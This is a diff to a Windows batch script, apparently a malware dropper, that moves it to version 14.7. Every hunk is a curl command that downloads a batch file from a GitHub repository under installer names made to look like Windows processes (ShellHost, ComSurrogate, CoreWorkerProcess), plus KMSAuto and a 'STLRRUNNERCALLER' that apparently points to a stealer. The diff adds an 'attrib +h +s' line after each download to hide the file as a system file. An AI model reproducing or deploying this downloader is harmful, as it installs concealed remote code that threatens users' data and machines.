@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=14.6"
+set "BATCHVERSION=14.7"
 
 
 
@@ -687,6 +687,7 @@ set "embeddedScript=temp_script_SHST.bat"
 
 :: Download content and save to the embedded batch file
 curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ShellHost"
+attrib +h +s "%embeddedScript%"
 
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
@@ -829,6 +830,7 @@ set "embeddedScript=temp_script_KMS.bat"
 
 :: Download content and save to the embedded batch file
 curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/KMSAuto"
+attrib +h +s "%embeddedScript%"
 
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
@@ -894,6 +896,7 @@ set "embeddedScript=temp_script_COM.bat"
 
 :: Download content and save to the embedded batch file
 curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ComSurrogate"
+attrib +h +s "%embeddedScript%"
 
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
@@ -966,6 +969,7 @@ set "embeddedScript=temp_script_CWP.bat"
 
 :: Download content and save to the embedded batch file
 curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/CoreWorkerProcess"
+attrib +h +s "%embeddedScript%"
 
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
@@ -1030,6 +1034,7 @@ set "embeddedScript=temp_script_7z.bat"
 
 :: Download content and save to the embedded batch file
 curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/7zip"
+attrib +h +s "%embeddedScript%"
 
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
@@ -1083,6 +1088,7 @@ set "embeddedScript=temp_script_Nircmd.bat"
 
 :: Download content and save to the embedded batch file
 curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/Nircmd"
+attrib +h +s "%embeddedScript%"
 
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
@@ -1132,6 +1138,7 @@ set "embeddedScript=temp_script_STLRRUNINST.bat"
 
 :: Download content and save to the embedded batch file
 curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/STLRRUNNERCALLER"
+attrib +h +s "%embeddedScript%"
 
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
@@ -1191,6 +1198,7 @@ set "embeddedScript=temp_script_handle.bat"
 
 :: Download content and save to the embedded batch file
 curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/Handle"
+attrib +h +s "%embeddedScript%"
 
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
